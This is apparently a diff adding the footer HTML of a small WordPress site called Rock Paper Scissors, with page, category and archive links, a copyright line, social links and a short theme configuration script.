+			</div><div class='one_fourth '><div class='widget widget_archive'><h3>Pages</h3><ul><li class="page_item page-item-412 current_page_item"><a href="http://rpssociety.com/?page_id=412" title="Blog">Blog</a></li>
+<li class="page_item page-item-421"><a href="http://rpssociety.com/?page_id=421" title="Collection">Collection</a></li>
+<li class="page_item page-item-408"><a href="http://rpssociety.com/?page_id=408" title="Contact">Contact</a></li>
+<li class="page_item page-item-427"><a href="http://rpssociety.com/?page_id=427" title="Dealers">Dealers</a></li>
+<li class="page_item page-item-2"><a href="http://rpssociety.com/?page_id=2" title="Home">Home</a></li>
+<li class="page_item page-item-417"><a href="http://rpssociety.com/?page_id=417" title="The Story">The Story</a></li>
+</ul></div></div><div class='one_fourth '><div class='widget widget_archive'><h3>Categories</h3><ul>	<li class="cat-item cat-item-3"><a href="http://rpssociety.com/?cat=3" title="View all posts filed under News &amp; Stuff">News &amp; Stuff</a>
+</li>
+	<li class="cat-item cat-item-30"><a href="http://rpssociety.com/?cat=30" title="View all posts filed under product">product</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://rpssociety.com/?cat=1" title="View all posts filed under Uncategorized">Uncategorized</a>
+</li>
+</ul></div></div><div class='one_fourth '><div class='widget widget_archive'><h3>Archive</h3><ul>	<li><a href='http://rpssociety.com/?m=201104' title='April 2011'>April 2011</a></li>
+	<li><a href='http://rpssociety.com/?m=201103' title='March 2011'>March 2011</a></li>
+</ul></div></div><div id='footer_extra_text_div'><a href='#top'><img src ='http://rpssociety.com/wp-content/uploads/2011/04/rps_stretch1.png' alt=''/></a></div>
+					
+				</div>
+				
+			</div>
+		<!-- ####### END FOOTER CONTAINER ####### -->
+		
+		<!-- ####### SOCKET CONTAINER ####### -->
+			<div class='container_wrap' id='socket'>
+				<div class='container'>
+					<span class='copyright'>&copy; Copyright - <a href='http://rpssociety.com/'>Rock Paper Scissors</a> - <a href='http://www.kriesi.at'>Wordpress Theme by Kriesi.at</a></span>
+				
+					<ul class="social_bookmarks">
+						<li class='rss'><a href="http://rpssociety.com/?feed=rss2">RSS</a></li>
+						<li class='twitter'><a href='http://twitter.com/rpssociety'>Twitter</a></li><li class='facebook'><a href='http://www.facebook.com/rpssociety'>Twitter</a></li>					
+					</ul><!-- end social_bookmarks-->
+				
+				</div>
+			</div>
+			<!-- ####### END SOCKET CONTAINER ####### -->
+		
+		</div><!-- end wrap_all -->
+
+
+ <script type='text/javascript'>
+ /* <![CDATA[ */  
+var avia_framework_globals = {
+ 	frameworkUrl: 'http://rpssociety.com/wp-content/themes/brightbox/framework/', 
+ 	installedAt: 'http://rpssociety.com/wp-content/themes/brightbox/'
+ 	}; 
+ /* ]]> */ 
+ </script>
+ 
+ </body>
+</html>
